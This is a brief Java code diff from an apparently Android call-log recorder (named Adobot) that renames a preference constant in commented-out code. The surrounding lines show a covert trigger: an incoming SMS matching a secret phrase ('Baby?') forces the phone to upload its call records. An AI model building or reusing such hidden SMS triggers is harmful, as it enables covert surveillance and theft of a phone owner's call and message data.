@@ -339,7 +339,7 @@ public class CallLogRecorderTask extends BaseTask {
 //                return;
 //            }
 //
-//            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
+//            String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_FORCE_SYNC_SMS_COMMAND_FIELD, "Baby?");
 //            if (Objects.equals(body.trim(), uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
 //                Log.i(TAG, "Forced submit SMS");
 //                submitNextRecord(new SubmitCallLogCallback() {
